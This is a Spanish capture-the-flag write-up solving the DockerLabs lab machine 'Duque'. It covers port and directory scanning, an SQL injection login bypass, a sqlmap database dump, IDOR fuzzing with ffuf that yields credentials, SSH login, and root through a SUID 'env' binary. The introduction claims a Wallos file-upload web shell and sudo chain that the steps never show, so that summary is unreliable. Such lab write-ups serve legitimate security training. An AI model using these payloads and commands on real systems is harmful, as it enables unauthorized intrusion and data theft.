## Introducción

Este documento presenta la resolución completa de la máquina **Duque**, desarrollada por *jes507* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone una aplicación web vulnerable que utiliza una versión específica del gestor **Wallos**, la cual presenta una **vulnerabilidad de carga arbitraria de archivos** que permite el despliegue de una **web shell**. A partir de esta, se obtiene ejecución remota de comandos como el usuario `www-data`.
Tras el acceso inicial, se encadenan múltiples **configuraciones inseguras de `sudo`**, permitiendo la ejecución de binarios como otros usuarios sin autenticación adicional, lo que facilita una escalada de privilegios progresiva hasta obtener acceso completo como `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Duque.zip
sudo bash auto_deploy.sh Duque.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Duque/{content,exploits,nmap,scripts}
cd Duque
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1783644410/Ports_cxqzff.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web

Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:

```bash
feroxbuster -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,js,txt,html
```

![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1783644303/Feroxbuster_vqbnph.png)

**Rutas encontradas:**
- `/index` — Página de login.
  ![Login](https://res.cloudinary.com/dewqswzke/image/upload/v1783644409/Index_ew946t.png)
- `/bills` — Formulario de acceso a cuentas.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 SQL Injection

El formulario de `/bills` es básico, por lo que se prueba un bypass por SQL Injection:

```
user: admin' OR 1=1-- -
password: admin' OR 1=1-- -
```

Esto redirige a un panel que muestra los permisos del usuario `mario`, pero sin los permisos necesarios.

![Bypass](https://res.cloudinary.com/dewqswzke/image/upload/v1783644303/Bypass_rnqeke.png)

### 2.2 Extracción de datos con SQLMap

Se confirma que la SQL Injection es posible, por lo que se utiliza `sqlmap` para enumerar las bases de datos:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" --forms --batch --dbs
```

![Databases](https://res.cloudinary.com/dewqswzke/image/upload/v1783644303/Databases_znvex3.png)

La base de datos `register` es la única relevante. Se vuelcan los datos:

```bash
sqlmap -u "http://172.17.0.2/bills/index.php" --forms --batch -D register --dump
```

![Users](https://res.cloudinary.com/dewqswzke/image/upload/v1783644412/Users_cm1fod.png)

### 2.3 IDOR y obtención de credenciales

Se accede a la web con el usuario `admin` y se observa un panel de gestión de facturas. Se identifica una posible vulnerabilidad **IDOR**, ya que busca archivos por medio de códigos similares.

Se desarrolla un diccionario para fuzzing:

```python
lista = [f"xy{c}{n:03d}" for c in 'abcdefghijklmnopqrstuvwxyz' for n in range(1000)]
with open("list.txt", "w") as f:
    f.write("\n".join(lista))
```

Se utiliza `ffuf` para comprobar qué IDs son válidos:

```bash
ffuf -u 'http://172.17.0.2/bills/panel.php?id=FUZZ' -w list.txt -b 'PHPSESSID=SESSID' -fw 2616 -fs 6163 -c
```

Se obtienen varios resultados. Al revisarlos manualmente, el ID `xyc724` contiene credenciales del usuario `duque`.

![ID hint](https://res.cloudinary.com/dewqswzke/image/upload/v1783644409/Id_sft1nl.png)

### 2.4 Acceso SSH

Con las credenciales obtenidas, se accede al sistema vía SSH:

```bash
ssh duque@172.17.0.2
```

![SSH access](https://res.cloudinary.com/dewqswzke/image/upload/v1783644411/Ssh_fensbf.png)

## Paso 3 — Escalada de privilegios

### 3.1 De duque → root

No se tienen permisos `sudo -l`, por lo que se procede a revisar los binarios con permiso **SUID**:

```bash
find / -perm -4000 2>/dev/null
```

![Find result](https://res.cloudinary.com/dewqswzke/image/upload/v1783644323/Find_a2tz1v.png)

Se encuentra el binario `env` con permiso SUID. Se ejecuta lo siguiente:

```bash
env /bin/bash -p
```

Se obtienen permisos de administrador:

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1783644410/Root_v8wy2m.png)
